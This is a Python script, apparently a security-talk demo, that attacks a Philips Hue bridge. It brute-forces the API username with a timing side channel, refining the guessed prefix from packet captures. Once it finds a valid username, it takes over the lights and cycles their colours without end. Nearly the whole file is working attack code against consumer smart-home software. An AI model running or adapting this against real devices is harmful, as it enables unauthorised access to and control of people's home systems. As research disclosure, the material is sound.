#!/usr/bin/env python
"""I know this is terrible looking code. It's what came out of all the
experimentation necessary to make this work. Hopefully I can clean it
up and release something more presentable after the talk.

I hate those people who never get around to releasing their code or
slides because it looks ugly.

"""
from pprint import pprint
import string
import random
import time
import string
import json
import sys
import subprocess

# monkeypatch requests
import utils

import requests

import discover
import users
import calculate_guess
import results


def control_the_lights(hue_url, username):
    """ Do something to get people's attention """
    api_url = hue_url + 'api/{}/'.format(username)
    print "Searching for lights"
    res = s.post(api_url + 'lights')
    pprint(res.json())
    light_color = 0
    while True:
        res = s.get(api_url + 'lights')
        if res.json():
            pprint(res.json())
        light_ids = res.json().keys()
        for light_id in light_ids:
            light_color += 25500
            light_color = light_color % 65535
            body = {
                "hue": light_color,
                "sat": 255,
                "on": True,
                "bri": 255,
            }
            res = s.put(api_url + 'lights/{}/state'.format(light_id),
                        data=json.dumps(body))
#            pprint(res.json())
            time.sleep(1)
        time.sleep(1)


s = requests.Session()
s.headers = {}  # make our packet smaller. The server ignores headers
hue_url = 'http://169.254.159.24/'
#hue_url = discover.find_hue()

if len(sys.argv) > 1:
    # oh boy, adding options. rewrite this after the talk...
    current_guess = sys.argv[1]
else:
    current_guess = users.USERNAME_PREFIX

count = -1  # hack to parse data first. This lets us restart the process. Sorta
start_time = time.time()
interval = start_time
guess_time = start_time
username_generators = []
def make_username_generators(current_guess):
    results = []
    for next_guess in users.charset():
        results.append(users.generate_username(current_guess + next_guess))
    return results

next_guess = current_guess
print "CURRENT_GUESS: ", current_guess
print "Collecting data:"
while True:
    if next_guess == current_guess:
        guess_time = time.time()
        print "Making new username generators with prefix:", current_guess
        username_generators = make_username_generators(current_guess)
        next_guess = None
    # shuffle the charset, but cycle every guess before repeating
    for usergen in username_generators:
        username = usergen.next()
        res = s.get(hue_url + 'api/{}/config'.format(username))
        count += 1
        if 'whitelist' in res.json():  # we got back a full config string...
            print "=" * 80
            print "\nFound correct username: ", username
            print "Elapsed time: ", (time.time() - start_time) / 60, 'min'
            print "Total Attempts: ", count
            print "=" * 80
            control_the_lights(hue_url, username)
            exit()
        #pprint(res.json())
        if count % 100 == 0:
            now = time.time()
            elapsed = now - start_time
            print "{} {:.2f} {:.2f}".format(
                count, elapsed, 100 / (now - interval))
            interval = now
            if count % 3000 == 0:
                time.sleep(0.05) # let any existing connections finish
                print "Current guess: ", current_guess
                print "Parsing data..."
                subprocess.call(
                    './parse_pcap.py data/*.pcap', shell=True) # I know, I know
                print "Calculating next guess..."
                data = results.read_data(
                    bucket=r'^/api/(%s\w)\w+/config$' % current_guess,
                    data_dir='data')
                next_guess = calculate_guess.next_guess(data)
                if next_guess is not None:
                    current_guess = next_guess
                    print "CHANGING GUESS: ", current_guess
                    print "Guess time: ", time.time() - guess_time
                    subprocess.call('make clean', shell=True)  # dump old data
                print "Collecting data:"
#        time.sleep(0.005)
    random.shuffle(username_generators)
